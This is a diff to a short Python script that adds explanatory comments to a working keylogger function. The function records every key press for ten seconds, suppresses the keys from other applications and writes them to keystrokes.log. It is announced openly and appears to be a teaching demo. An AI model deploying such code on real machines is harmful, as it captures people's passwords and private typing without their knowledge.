@@ -3,17 +3,17 @@
 import keyboard
 import time
 
-def keylogger(duration=10):
+def keylogger(duration=10):                     #it will run for 10 seconds
 	print(f"Simulating keylogger for {duration} seconds (press ESC to stop)...")
-	start_time = time.time()
+	start_time = time.time()                    #time.time() returns the current time in seconds
 	log_file = "keystrokes.log"
 
 	with open(log_file, "a") as f:
 		while time.time() - start_time < duration:
 			try:
 				# Record next key press
-				event = keyboard.read_event(suppress=True)
-				if event.event_type == "down":
+				event = keyboard.read_event(suppress=True)                   # (suppress=True) prevent that key event from being passed on to other applications
+				if event.event_type == "down":                               # down:  makes the program log only the press event(down)
 					key = event.name
 					f.write(f"{key}\n")
 					print(f"Logged: {key}")
